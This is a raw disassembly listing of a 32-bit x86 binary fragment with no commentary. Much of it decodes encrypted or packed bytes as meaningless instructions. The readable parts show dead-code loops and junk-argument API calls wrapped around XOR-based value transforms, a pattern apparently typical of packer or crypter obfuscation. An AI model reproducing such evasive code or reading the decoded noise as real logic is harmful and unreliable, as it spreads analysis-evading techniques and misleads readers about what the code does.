  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	inc    ebx
  408cb7:	test   DWORD PTR [esi],ebx
  408cb9:	or     dl,BYTE PTR [esp+ebx*8]
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	mov    al,ds:0xf528e38
  408cc7:	jns    0x408ce1
  408cc9:	jg     0x408d1e
  408ccb:	or     eax,0x7584a70f
  408cd0:	(bad)  [eax+ebx*1-0x45282faf]
  408cd7:	mov    eax,0x3e70ac
  408cdc:	and    al,0x65
  408cde:	imul   ebp,DWORD PTR [eax+0x11f1da59],0x2c3cf415
  408ce8:	data16 adc bl,BYTE PTR [edx]
  408ceb:	icebp  
  408cec:	call   0xcb48:0xf9ea4a6f
  408cf3:	pop    edx
  408cf4:	inc    edi
  408cf5:	(bad)  
  408cf6:	mov    edi,0xdc79cab8
  408cfb:	sti    
  408cfc:	call   0x5776:0xb64e8dac
  408d03:	mov    BYTE PTR [edx],cl
  408d05:	gs mov bh,0xb8
  408d08:	test   al,0x6e
  408d0a:	inc    esp
  408d0b:	test   al,0xbd
  408d0d:	imul   ebp,DWORD PTR [esi],0x23
  408d10:	dec    edx
  408d11:	pop    edi
  408d12:	popa   
  408d13:	hlt    
  408d14:	and    eax,0x5c3a7752
  408d19:	idiv   BYTE PTR [ebx-0x31]
  408d1c:	fst    QWORD PTR [eax+0x39]
  408d1f:	jp     0x408d35
  408d21:	fld    st(7)
  408d23:	ret    
  408d24:	mov    edx,0x7bf2af90
  408d29:	and    BYTE PTR ds:[eax+0x69],bh
  408d2d:	jnp    0x408d96
  408d2f:	int3   
  408d30:	stos   BYTE PTR es:[edi],al
  408d31:	and    al,0xa9
  408d33:	lahf   
  408d34:	pop    ss
  408d35:	jge    0x408d4a
  408d37:	popf   
  408d38:	(bad)  
  408d39:	jno    0x408d5d
  408d3b:	shl    BYTE PTR [ebp+0x4f5345ef],0x4b
  408d42:	cmp    esi,ebp
  408d44:	pop    es
  408d45:	fistp  QWORD PTR [edi-0x13b656c8]
  408d4b:	cld    
  408d4c:	cmp    ah,dl
  408d4e:	sbb    dh,bl
  408d50:	inc    edx
  408d51:	cdq    
  408d52:	mov    al,ds:0x9cb7390
  408d57:	add    esi,ecx
  408d59:	jb     0x408d32
  408d5b:	bound  eax,QWORD PTR [edx]
  408d5d:	push   esi
  408d5e:	xchg   ecx,eax
  408d5f:	aas    
  408d60:	test   eax,0xfaf706f3
  408d65:	xchg   edi,eax
  408d66:	test   BYTE PTR [esi],bh
  408d68:	prefetch (bad)
  408d69:	or     eax,0x1e347bf3
  408d6e:	das    
  408d6f:	popa   
  408d70:	pop    ss
  408d71:	cmp    ebp,DWORD PTR [esi]
  408d73:	jbe    0x408d5a
  408d75:	std    
  408d76:	out    dx,al
  408d77:	rol    DWORD PTR [ebx],0x73
  408d7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d7b:	int3   
  408d7c:	aaa    
  408d7d:	jno    0x408df7
  408d7f:	inc    edx
  408d80:	add    al,0x11
  408d82:	jp     0x408d15
  408d84:	repz in eax,0x7d
  408d87:	scas   al,BYTE PTR es:[edi]
  408d88:	out    0xaf,al
  408d8a:	jmp    0x408d23
  408d8c:	test   al,0x86
  408d8e:	push   ecx
  408d8f:	les    ecx,FWORD PTR [edi]
  408d91:	and    al,0x4f
  408d93:	dec    ebx
  408d94:	jg     0x408d21
  408d96:	in     eax,dx
  408d97:	mov    eax,ds:0x4872fb3c
  408d9c:	dec    esp
  408d9d:	dec    edi
  408d9e:	test   DWORD PTR [ecx],edx
  408da0:	mov    ah,0xf2
  408da2:	sbb    al,0x40
  408da4:	outs   dx,BYTE PTR ds:[esi]
  408da5:	add    esi,DWORD PTR [ecx+0x6f5939af]
  408dab:	in     eax,0x62
  408dad:	(bad)  
  408dae:	xchg   ebp,eax
  408daf:	lock add esi,esp
  408db2:	into   
  408db3:	fidiv  WORD PTR [edi-0x21]
  408db6:	ins    BYTE PTR es:[edi],dx
  408db7:	push   ebx
  408db8:	add    al,0x77
  408dba:	cmp    al,0x25
  408dbc:	mov    esp,0x54857614
  408dc1:	mov    ebx,0x15a1778e
  408dc6:	sar    dh,1
  408dc8:	addr16 mov ebx,0xdd560126
  408dce:	xchg   esi,eax
  408dcf:	inc    esi
  408dd0:	pusha  
  408dd1:	(bad)  
  408dd2:	test   BYTE PTR ds:0x6ab8f692,0x43
  408dd9:	ds add al,0xd1
  408ddc:	leave  
  408ddd:	int3   
  408dde:	add    al,BYTE PTR [ebx-0x18]
  408de1:	jmp    0xbd54ca1
  408de6:	push   0x32
  408de8:	mov    edx,0x2849d101
  408ded:	imul   ebx,edi,0x41
  408df0:	pushf  
  408df1:	and    cl,BYTE PTR [ecx-0x158c066d]
  408df7:	popf   
  408df8:	and    bh,BYTE PTR [eax-0x16f9535d]
  408dfe:	scas   al,BYTE PTR es:[edi]
  408dff:	clc    
  408e00:	stos   BYTE PTR es:[edi],al
  408e01:	and    ecx,esp
  408e03:	sti    
  408e04:	inc    esp
  408e05:	outs   dx,BYTE PTR ds:[si]
  408e07:	push   ebp
  408e08:	jno    0x408e14
  408e0a:	xor    BYTE PTR [eax-0x2670e2ca],0x77
  408e11:	xchg   esi,eax
  408e12:	mov    ecx,ecx
  408e14:	fidiv  DWORD PTR [ecx-0x35dc9c8e]
  408e1a:	shl    DWORD PTR [eax+0x1],1
  408e1d:	cs jno 0x408e13
  408e20:	mov    al,ds:0x38683c3a
  408e25:	mov    ds:0x64346caf,al
  408e2a:	out    dx,al
  408e2b:	dec    esi
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0xe2fac50b
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	cmp    al,0x65
  408e69:	cmp    bl,BYTE PTR [eax-0x1721054f]
  408e6f:	nop
  408e70:	xor    eax,0x9279f5aa
  408e75:	sub    eax,0xa4b5ef81
  408e7a:	(bad)  
  408e7b:	mov    ebx,0x78fc52bc
  408e80:	lock cmp bh,dh
  408e83:	dec    esi
  408e84:	push   ebx
  408e85:	sbb    DWORD PTR [edi+0x73],0xffffffbb
  408e89:	popa   
  408e8a:	and    cl,BYTE PTR [edi-0x2e]
  408e8d:	jns    0x408e4d
  408e8f:	aas    
  408e90:	sub    eax,0x42db3680
  408e95:	in     eax,dx
  408e96:	mov    dl,0xcb
  408e98:	sub    DWORD PTR [ebp-0x2160adc6],edx
  408e9e:	(bad)  
  408e9f:	sbb    edx,DWORD PTR [eax]
  408ea1:	and    DWORD PTR [edx+edi*4+0x2328d4c4],0xffffff8f
  408ea9:	add    ch,BYTE PTR [ecx]
  408eab:	or     edi,ebx
  408ead:	xor    eax,0xd5c1a5e2
  408eb2:	scas   al,BYTE PTR es:[edi]
  408eb3:	dec    esi
  408eb4:	cmp    BYTE PTR [eax-0x49],dl
  408eb7:	pop    edi
  408eb8:	mov    dh,0x6e
  408eba:	xchg   ebx,eax
  408ebb:	jns    0x408e98
  408ebd:	pop    eax
  408ebe:	test   al,0x97
  408ec0:	adc    edi,edx
  408ec2:	mov    ecx,0xf510d686
  408ec7:	add    bl,bh
  408ec9:	out    0xc,al
  408ecb:	inc    ebp
  408ecc:	in     eax,dx
  408ecd:	pop    edx
  408ece:	pop    ebx
  408ecf:	fist   WORD PTR [edx+edi*4+0x188c1f7]
  408ed6:	and    dh,BYTE PTR [ebx+0x7a]
  408ed9:	lods   eax,DWORD PTR ds:[esi]
  408eda:	mov    eax,ds:0xfa900fae
  408edf:	outs   dx,BYTE PTR ds:[esi]
  408ee0:	ss aas 
  408ee2:	bswap  eax
  408ee4:	xor    ah,BYTE PTR [esi+0x7]
  408ee7:	mov    al,0xd4
  408ee9:	mov    al,0xc
  408eeb:	(bad)  
  408eec:	fyl2xp1 
  408eee:	shl    BYTE PTR [edi],1
  408ef0:	outs   dx,BYTE PTR ds:[esi]
  408ef1:	xor    ecx,edi
  408ef3:	adc    BYTE PTR [edx],bh
  408ef5:	sbb    al,BYTE PTR [ecx]
  408ef7:	lds    edi,FWORD PTR [edi+0x4f]
  408efa:	pop    esp
  408efb:	call   esi
  408efd:	lea    esi,[esi+eax*8+0x2c]
  408f01:	popa   
  408f02:	sbb    DWORD PTR [edi],ecx
  408f04:	ins    DWORD PTR es:[edi],dx
  408f05:	pusha  
  408f06:	mov    ds:0x1db22986,eax
  408f0b:	(bad)  
  408f0c:	repnz inc ecx
  408f0e:	in     eax,0xed
  408f10:	dec    esi
  408f11:	mov    bh,0x86
  408f13:	pop    eax
  408f14:	push   ds
  408f15:	(bad)  
  408f17:	in     al,0x2b
  408f19:	dec    esp
  408f1a:	and    ch,BYTE PTR [ecx+0x3b]
  408f1d:	mov    ebx,esi
  408f1f:	push   ebp
  408f20:	push   0x238bf839
  408f25:	loopne 0x408eaf
  408f27:	outs   dx,BYTE PTR ds:[esi]
  408f28:	add    bh,al
  408f2a:	test   al,0xdc
  408f2c:	and    ebp,ebp
  408f2e:	pop    edx
  408f2f:	mov    DWORD PTR [esi],edx
  408f31:	xor    DWORD PTR [eax-0x6df1c58],0xf5ae8a7c
  408f3b:	aad    0x92
  408f3d:	rol    DWORD PTR [ecx+ebp*4+0x4757880c],0x8
  408f45:	mov    ebx,0x10e37332
  408f4a:	aaa    
  408f4b:	jae    0x408f16
  408f4d:	jmp    0x88a2:0xe46b2155
  408f54:	xor    BYTE PTR [ecx-0x17547f4b],ch
  408f5a:	nop
  408f5b:	mov    esp,0xf7335ce7
  408f60:	(bad)  
  408f61:	fldenv [ebx+eiz*2+0xda0b8c8]
  408f68:	jmp    0xff88:0x148cde19
  408f6f:	mov    ah,0x40
  408f71:	aas    
  408f72:	loopne 0x408fa7
  408f74:	stos   BYTE PTR es:[edi],al
  408f75:	shl    BYTE PTR [edi-0x6e],0x17
  408f79:	(bad)  
  408f7a:	aas    
  408f7b:	out    0x50,al
  408f7d:	inc    esp
  408f7e:	mov    al,0x93
  408f80:	push   edx
  408f81:	xchg   BYTE PTR [edi+eax*2-0x70],bl
  408f85:	xor    DWORD PTR [ecx-0x38ff3c0d],ebx
  408f8b:	pusha  
  408f8c:	ss jae 0x408fd9
  408f8f:	mov    ds:0xba7de6c1,eax
  408f94:	clc    
  408f95:	mov    bh,0xbc
  408f97:	retf   0xc65e
  408f9a:	mov    ch,ch
  408f9c:	xchg   ecx,eax
  408f9d:	xchg   ebp,eax
  408f9e:	loope  0x408fd9
  408fa0:	mov    al,0x9d
  408fa2:	inc    edi
  408fa3:	inc    esp
  408fa4:	mov    ds:0xe495b1fd,eax
  408fa9:	sbb    eax,edi
  408fab:	retf   0x968b
  408fae:	ins    BYTE PTR es:[edi],dx
  408faf:	jmp    0x39d11419
  408fb4:	push   ds
  408fb5:	pop    eax
  408fb6:	arpl   WORD PTR [esi],si
  408fb8:	(bad)  
  408fb9:	out    dx,eax
  408fba:	retf   0x51b9
  408fbd:	add    esi,DWORD PTR [esi+ecx*8-0x5a9c5f59]
  408fc4:	lods   al,BYTE PTR ds:[esi]
  408fc5:	xor    ebx,edx
  408fc7:	xor    eax,0x91f4c68
  408fcc:	sbb    BYTE PTR [ebx],0xa6
  408fcf:	fwait
  408fd0:	inc    edx
  408fd1:	cmp    DWORD PTR [eax],edi
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	lea    edi,[ebp+0x47]
  409167:	in     al,dx
  409168:	pusha  
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	sti    
  409171:	int    0xa4
  409173:	mov    eax,0x7ccec586
  409178:	and    eax,edi
  40917a:	adc    esi,DWORD PTR [ebx+0x61e26d85]
  409180:	(bad)  
  409181:	adc    ch,BYTE PTR [edx+edi*4-0x49]
  409185:	fcom   QWORD PTR [ebx]
  409187:	add    ah,cl
  409189:	jmp    edi
  40918b:	xor    esp,DWORD PTR [esi]
  40918d:	mov    ebp,0x92217e31
  409192:	sub    DWORD PTR [ebx],ebp
  409194:	xchg   ebp,eax
  409195:	pop    edx
  409196:	cs mov cl,0x1b
  409199:	sub    DWORD PTR [ecx+ecx*8-0x18796b6e],esp
  4091a0:	fbld   TBYTE PTR [ebx+0x1102fad5]
  4091a6:	pusha  
  4091a7:	je     0x409165
  4091a9:	fsubr  DWORD PTR [edi]
  4091ab:	fdiv   DWORD PTR [edx-0x3e5ab55e]
  4091b1:	jne    0x409186
  4091b3:	mov    bl,0x14
  4091b5:	call   0x2687:0x363344a7
  4091bc:	fs mov ah,0x24
  4091bf:	(bad)  
  4091c0:	or     esi,DWORD PTR [eax]
  4091c2:	not    DWORD PTR [edi-0x36376f24]
  4091c8:	sahf   
  4091c9:	or     eax,0xdd217261
  4091ce:	inc    edx
  4091cf:	xor    al,0x70
  4091d1:	push   edi
  4091d2:	sbb    al,0xdb
  4091d4:	mov    fs,WORD PTR [ecx]
  4091d6:	xlat   BYTE PTR ds:[ebx]
  4091d7:	cmp    al,0xcf
  4091d9:	add    DWORD PTR [esi],esp
  4091db:	push   0xffffffd8
  4091dd:	inc    ecx
  4091de:	adc    DWORD PTR [ecx+0x25947dcb],eax
  4091e4:	add    al,0x64
  4091e6:	adc    al,0xd6
  4091e8:	sub    eax,0x3f7c7beb
  4091ed:	in     al,dx
  4091ee:	mov    cl,BYTE PTR [ebx+0x6c7b55d]
  4091f4:	outs   dx,BYTE PTR ds:[esi]
  4091f5:	cwde   
  4091f6:	mov    esi,0x242a8044
  4091fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091fc:	sbb    al,0xe6
  4091fe:	(bad)  
  4091ff:	xor    BYTE PTR [edx-0x7c872e7d],ch
  409205:	adc    eax,0xa5fbef07
  40920a:	cli    
  40920b:	mov    al,0xf4
  40920d:	lock push edx
  40920f:	xchg   esi,eax
  409210:	cs mov al,0x7f
  409213:	jbe    0x40927d
  409215:	cld    
  409216:	xlat   BYTE PTR ds:[ebx]
  409217:	xlat   BYTE PTR ds:[ebx]
  409218:	sbb    dh,BYTE PTR ds:0xa5fa8214
  40921e:	xchg   edi,eax
  40921f:	xor    edx,DWORD PTR [edx-0x45ba8dbc]
  409225:	aad    0x2b
  409227:	jns    0x409282
  409229:	cmp    eax,0x924fb6ae
  40922e:	pop    ds
  40922f:	into   
  409230:	jg     0x409249
  409232:	(bad)  
  409233:	loopne 0x409237
  409235:	adc    eax,0x6169d726
  40923a:	mov    BYTE PTR [ebx+esi*2-0x5a],bl
  40923e:	adc    cl,BYTE PTR [esi-0x28b7ce55]
  409244:	ja     0x409206
  409246:	mov    bh,0x45
  409248:	popa   
  409249:	in     al,dx
  40924a:	and    ecx,DWORD PTR [esi+eax*8+0x44]
  40924e:	push   esp
  40924f:	cmp    dh,BYTE PTR [edx+0x5c]
  409252:	fwait
  409253:	sub    eax,0x71b0e8ca
  409258:	xchg   al,ch
  40925a:	mov    eax,0xa421cef7
  40925f:	push   ebx
  409260:	gs stos BYTE PTR es:[edi],al
  409262:	pop    ebp
  409263:	js     0x4091e6
  409265:	(bad)  
  409266:	or     al,0x81
  409268:	xor    eax,0x582e096d
  40926d:	mov    edx,0xb918a55f
  409272:	and    esi,DWORD PTR [edi]
  409274:	idiv   BYTE PTR ds:0x1fa5ce43
  40927a:	ds dec ecx
  40927c:	loop   0x409279
  40927e:	push   ds
  40927f:	mov    eax,0xa599228f
  409284:	mov    ebp,0x8aba551f
  409289:	fiadd  WORD PTR [edi+esi*4]
  40928c:	je     0x409243
  40928e:	or     dh,cl
  409290:	imul   esi,eax,0x865096db
  409296:	push   edx
  409297:	push   ecx
  409298:	mov    ah,0xf3
  40929a:	lods   al,BYTE PTR ds:[esi]
  40929b:	stos   BYTE PTR es:[edi],al
  40929c:	push   ds
  40929d:	push   eax
  40929e:	push   ss
  40929f:	imul   ebp,DWORD PTR [ebx-0x75],0xb5845244
  4092a6:	mov    eax,ds:0x93a0ee0a
  4092ab:	cli    
  4092ac:	cmp    BYTE PTR [edi+0x6e8ba962],bl
  4092b2:	sbb    al,0x2d
  4092b4:	test   al,0xff
  4092b6:	mov    eax,0x35aa555b
  4092bb:	pop    esi
  4092bc:	shl    BYTE PTR [esp+edi*4+0x4a287ee],cl
  4092c3:	sub    DWORD PTR [esi+0x6f0125aa],esp
  4092c9:	ret    
  4092ca:	inc    esp
  4092cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092cc:	xor    esi,0x23d6aaac
  4092d2:	(bad)  
  4092d3:	shr    DWORD PTR [ebx+0x37a9a5b3],1
  4092d9:	cmp    edi,esp
  4092db:	test   DWORD PTR [edi+0x13],0x7f6d6283
  4092e2:	mov    eax,ds:0x5c96cf9
  4092e7:	jae    0x409343
  4092e9:	je     0x40926c
  4092eb:	xlat   BYTE PTR ds:[ebx]
  4092ec:	sbb    edi,0x3e
  4092ef:	xchg   ecx,eax
  4092f0:	fcmovnbe st,st(4)
  4092f2:	sub    BYTE PTR [esi-0x5c],dh
  4092f5:	sbb    eax,0x11471e91
  4092fa:	sti    
  4092fb:	addr16 sub edx,0xffffffc9
  4092ff:	int    0xb7
  409301:	sbb    edi,DWORD PTR [esi]
  409303:	sbb    ecx,DWORD PTR [edx-0x30]
  409306:	jnp    0x409355
  409308:	add    al,0x33
  40930a:	scas   al,BYTE PTR es:[edi]
  40930b:	leave  
  40930c:	mov    esi,0x164bb0ee
  409311:	mov    esi,0x8f8e3a7c
  409316:	sbb    eax,0x7e276822
  40931b:	dec    esi
  40931c:	fwait
  40931d:	mov    al,0x49
  40931f:	int3   
  409320:	jmp    0x4172:0xfeea3d30
  409327:	rcl    BYTE PTR [ebx-0x31],cl
  40932a:	outs   dx,BYTE PTR ds:[esi]
  40932b:	int    0x99
  40932d:	inc    edx
  40932e:	pop    esp
  40932f:	mov    bl,0xb3
  409331:	inc    esi
  409332:	pop    esi
  409333:	add    DWORD PTR [edi],0x19
  409336:	push   edx
  409337:	ror    ah,1
  409339:	mov    edx,0x61482e84
  40933e:	icebp  
  40933f:	mov    esi,0x8e9a9c63
  409344:	retf   0x1346
  409347:	inc    esp
  409348:	push   edi
  409349:	(bad)  
  40934a:	pop    edi
  40934b:	xlat   BYTE PTR ds:[ebx]
  40934c:	mov    dl,0x51
  40934e:	lock mov bl,0x12
  409351:	sbb    al,0xb3
  409353:	xor    ah,bl
  409355:	mov    esi,DWORD PTR ds:0x99911e4b
  40935b:	cs pop ds
  40935d:	rcl    BYTE PTR [ebx],1
  40935f:	imul   eax,DWORD PTR [esi],0xffffff9d
  409362:	aaa    
  409363:	pop    esp
  409364:	sti    
  409365:	icebp  
  409366:	or     al,ch
  409368:	adc    al,0xb1
  40936a:	inc    ebx
  40936b:	in     al,dx
  40936c:	sbb    ebp,edi
  40936e:	dec    ecx
  40936f:	mov    dl,0x2
  409371:	sub    ebp,DWORD PTR [esi+0x37]
  409374:	inc    edx
  409375:	mov    ebp,0x383d4bc9
  40937a:	mov    edx,DWORD PTR [ecx+0x33]
  40937d:	adc    ch,BYTE PTR [esi+0x77]
  409380:	mov    ebx,ecx
  409382:	je     0x409385
  409384:	or     ecx,DWORD PTR [eax+ebp*4-0x1e]
  409388:	adc    eax,0xe679ed82
  40938d:	add    BYTE PTR [eax+0x54],al
  409390:	ret    
  409391:	ret    0x2d2
  409394:	mov    ecx,0x988ba646
  409399:	mov    eax,0xf0288392
  40939e:	xor    DWORD PTR [edi+esi*8],eax
  4093a1:	fadd   DWORD PTR [edx-0x7c]
  4093a4:	mov    eax,ds:0xce200ac5
  4093a9:	xchg   edx,eax
  4093aa:	add    al,0x62
  4093ac:	test   eax,0x3f1f57da
  4093b1:	dec    edi
  4093b2:	or     DWORD PTR [ebx+0x2654401e],ebx
  4093b8:	adc    ah,BYTE PTR [edi*4-0xfd01797]
  4093bf:	sub    esp,DWORD PTR [esp+ecx*1]
  4093c2:	jmp    0x38b28d8f
  4093c7:	dec    ecx
  4093c8:	scas   eax,DWORD PTR es:[edi]
  4093c9:	pop    edi
  4093ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093cb:	xor    eax,0xc0b53d46
  4093d0:	pop    ds
  4093d1:	gs dec esp
  4093d3:	cmp    BYTE PTR [ebx+0x37c37160],dh
  4093d9:	ficomp WORD PTR [ebx-0x5054dd0a]
  4093df:	xchg   ebp,eax
  4093e0:	pop    edx
  4093e1:	push   eax
  4093e2:	arpl   WORD PTR [edx-0xd3d1243],si
  4093e8:	test   al,0xb3
  4093ea:	imul   ebp,DWORD PTR [edx],0x24216ab2
  4093f0:	mov    esi,0xb4668271
  4093f5:	xchg   ecx,eax
  4093f6:	(bad)  
  4093f7:	repnz arpl WORD PTR [edx+0x33],di
  4093fb:	fucom  st(2)
  4093fd:	test   eax,0x84a7f662
  409402:	in     al,dx
  409403:	xor    eax,0x9c5d42d7
  409408:	addr16 push ebx
  40940a:	or     edx,DWORD PTR ds:0xd3dd02c9
  409410:	stos   BYTE PTR es:[edi],al
  409411:	jb     0x409426
  409413:	arpl   sp,sp
  409415:	or     BYTE PTR [ecx],bh
  409417:	cmp    ebx,DWORD PTR [eax+0x174e756d]
  40941d:	mov    ecx,0x892cde82
  409422:	mov    ebp,0x371ddec1
  409427:	inc    ecx
  409428:	les    eax,FWORD PTR [esi+ebp*2]
  40942b:	loopne 0x40944f
  40942d:	mov    cl,0xba
  40942f:	add    al,0xa4
  409431:	gs fadd st,st(3)
  409434:	xchg   edi,eax
  409435:	aaa    
  409436:	xchg   edx,eax
  409437:	cdq    
  409438:	pop    ebp
  409439:	push   es
  40943a:	push   ecx
  40943b:	xor    ebp,edx
  40943d:	in     eax,0x74
  40943f:	cmc    
  409440:	and    dh,0xad
  409443:	mul    DWORD PTR [eax+0x3ff32178]
  409449:	push   edx
  40944a:	in     al,0x70
  40944c:	mov    ah,0xa1
  40944e:	popf   
  40944f:	mov    eax,ds:0x6b292277
  409454:	retf   
  409455:	inc    esp
  409456:	cld    
  409457:	outs   dx,DWORD PTR ds:[esi]
  409458:	sub    ebx,DWORD PTR [ebx-0x5b]
  40945b:	xchg   DWORD PTR [ecx-0x22235699],esi
  409461:	push   ecx
  409462:	push   ss
  409463:	aas    
  409464:	or     BYTE PTR [edi+0x12],bh
  409467:	shl    BYTE PTR [ecx],0x4b
  40946a:	scas   al,BYTE PTR es:[edi]
  40946b:	call   0x466c:0x3e176074
  409472:	inc    ebp
  409473:	mov    ebp,0x31ec45c7
  409478:	test   DWORD PTR [eax+edi*8+0x382b2581],ebx
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
  4094f1:	cmp    DWORD PTR ds:0x433777,0x13
  4094f8:	jae    0x40951b
  4094fe:	cmp    DWORD PTR ds:0x433777,0x22
  409505:	jne    0x409516
  40950b:	push   0x24ee
  409510:	call   DWORD PTR ds:0x4123a0
  409516:	jmp    0x4094e4
  40951b:	mov    DWORD PTR [ebp-0x20],eax
  40951e:	and    DWORD PTR ds:0x43377b,0x0
  409528:	jmp    0x409538
  40952d:	mov    eax,ds:0x43377b
  409532:	inc    eax
  409533:	mov    ds:0x43377b,eax
  409538:	cmp    DWORD PTR ds:0x43377b,0x11
  40953f:	jae    0x409578
  409545:	cmp    DWORD PTR ds:0x43377b,0x9
  40954c:	jne    0x40955b
  409552:	push   DWORD PTR [ebp-0x1c]
  409555:	call   DWORD PTR ds:0x412018
  40955b:	cmp    DWORD PTR ds:0x43377b,0x8
  409562:	jne    0x409573
  409568:	mov    eax,ds:0x43377b
  40956d:	inc    eax
  40956e:	mov    ds:0x43377b,eax
  409573:	jmp    0x40952d
  409578:	mov    eax,DWORD PTR [ebp-0x14]
  40957b:	sbb    ebx,0x50bb
  409581:	mov    ecx,DWORD PTR [ebp-0x20]
  409584:	xor    eax,esi
  409586:	and    ebx,0x1e7c
  40958c:	add    eax,edi
  40958e:	sub    DWORD PTR ds:0x4337b7,ecx
  409594:	mov    DWORD PTR [ecx],eax
  409596:	or     ebx,ebx
  409598:	mov    eax,ds:0x413cb2
  40959d:	mov    ebx,0x8e12feb8
  4095a2:	mov    DWORD PTR [ebp-0xc],ebx
  4095a5:	xor    DWORD PTR ds:0x433723,0x433713
  4095af:	mov    eax,DWORD PTR [eax]
  4095b1:	and    DWORD PTR ds:0x433733,0x43382f
  4095bb:	mov    cx,WORD PTR [ebp-0x4]
  4095bf:	jmp    0x4098e0
  4095c4:	jge    0x40957b
  4095c6:	mov    edx,0x397172fe
  4095cb:	mov    ch,0x54
